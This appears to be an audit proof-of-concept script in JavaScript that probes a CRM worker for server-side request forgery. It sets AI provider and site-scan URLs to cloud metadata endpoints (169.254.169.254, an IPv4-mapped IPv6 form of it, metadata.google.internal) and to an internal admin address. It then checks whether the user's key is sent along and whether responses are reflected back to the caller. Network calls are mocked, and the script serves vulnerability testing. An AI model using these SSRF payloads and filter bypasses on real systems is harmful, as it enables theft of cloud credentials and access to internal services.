// Portable repro (audit 2026-09-03). Run from anywhere: node nexuscrm/audit/repro/ai_conn_probe2.mjs
import { fileURLToPath, pathToFileURL } from 'node:url';
const ROOT = fileURLToPath(new URL('../../', import.meta.url));
import { readFileSync } from 'node:fs';
import { createRequire } from 'node:module';
const require = createRequire(import.meta.url);
const { init, DB } = require((ROOT+'tests/d1mock.js'));
await init(readFileSync((ROOT+'backend/schema.sql'),'utf8'));
const worker = (await import(pathToFileURL(ROOT+'backend/src/index.js').href)).default;
const env = { DB, API_IP_RATE_MAX: 1e9, API_TOKEN_RATE_MAX: 1e9, ENCRYPTION_KEY: 'test-secret' }; const ctx = { waitUntil: (p) => Promise.resolve(p).catch(()=>{}) }; const BASE='http://test.local';
let log = [];
globalThis.fetch = async (url, opts={}) => { log.push({url:String(url), auth:(opts.headers||{}).Authorization||''}); return new Response(JSON.stringify({choices:[{message:{content:'ok'}}], model:'m'}),{status:200,headers:{'Content-Type':'application/json'}}); };
async function call(method, path, body, token){ const h={'Content-Type':'application/json',Origin:'http://app.local'}; if(token) h.Authorization='Bearer '+token; const r=await worker.fetch(new Request(BASE+'/api'+path,{method,headers:h,body:body?JSON.stringify(body):undefined}),env,ctx); return {status:r.status,data:await r.json().catch(()=>null)}; }
const token = (await call('POST','/auth/register',{name:'T',email:'t@x.com',password:'password123',workspace_name:'W'})).data.token;
await call('PATCH','/ai/settings',{provider:'nvidia', nvidia_key:'nvapi-abcdefghijklmnop1234567890'},token);
// SSRF via NVIDIA base URL: IPv4-mapped IPv6 was accepted at save time. Does the worker then actually fetch it, with the user's key attached?
const s = await call('PATCH','/ai/settings',{nvidia_base_url:'http://[::ffff:169.254.169.254]/v1'},token); console.log('save [::ffff:169.254.169.254] →', s.status);
log=[]; const c = await call('POST','/ai/complete',{prompt:'hi'},token); console.log('  /ai/complete → outbound:', log.map(l=>l.url).join(', ') || '(none)', '| status', c.status, JSON.stringify(c.data).slice(0,80));
log=[]; const sc = await call('POST','/ai/scan-site',{url:'http://[::ffff:10.0.0.5]/admin'},token); console.log('  scan-site [::ffff:10.0.0.5] → outbound:', log.map(l=>l.url).join(', ') || '(none)', '| status', sc.status);
// custom provider: key length gate – give it a long key
const s2 = await call('PATCH','/ai/settings',{provider:'custom', custom_base_url:'http://169.254.169.254/latest', custom_key:'x'.repeat(20)},token); console.log('custom provider = 169.254.169.254 (allowLocalHost=true) →', s2.status, JSON.stringify(s2.data).slice(0,80));
if (s2.status===200) { log=[]; const c2 = await call('POST','/ai/complete',{prompt:'hi'},token); console.log('  /ai/complete → outbound:', log.map(l=>l.url+' (auth '+l.auth.slice(0,10)+'…)').join(', ') || '(none)', '| status', c2.status); }
const s3 = await call('PATCH','/ai/settings',{provider:'custom', custom_base_url:'http://metadata.google.internal/computeMetadata/v1', custom_key:'x'.repeat(20)},token); console.log('custom provider = metadata.google.internal →', s3.status);
if (s3.status===200) { log=[]; await call('POST','/ai/complete',{prompt:'hi'},token); console.log('  /ai/complete → outbound:', log.map(l=>l.url).join(', ') || '(none)'); }
// Does the response body of the "provider" get reflected back to the caller? (i.e. SSRF read-back)
globalThis.fetch = async (url) => new Response(JSON.stringify({choices:[{message:{content:'SECRET-METADATA-TOKEN-XYZ'}}]}),{status:200,headers:{'Content-Type':'application/json'}});
const rb = await call('POST','/ai/complete',{prompt:'hi'},token); console.log('  response reflected to caller:', JSON.stringify(rb.data).includes('SECRET-METADATA-TOKEN-XYZ'));
// Raw non-JSON body reflection (e.g. metadata service returns plain text)
globalThis.fetch = async (url) => new Response('ami-id\ninstance-id\niam/',{status:200,headers:{'Content-Type':'text/plain'}});
const rb2 = await call('POST','/ai/complete',{prompt:'hi'},token); console.log('  plain-text upstream → caller sees:', JSON.stringify(rb2.data).slice(0,160));
globalThis.fetch = async (url) => new Response('ami-id\ninstance-id\niam/ SECRET',{status:404,headers:{'Content-Type':'text/plain'}});
const rb3 = await call('POST','/ai/complete',{prompt:'hi'},token); console.log('  404 plain-text upstream → caller sees:', JSON.stringify(rb3.data).slice(0,200));
process.exit(0);
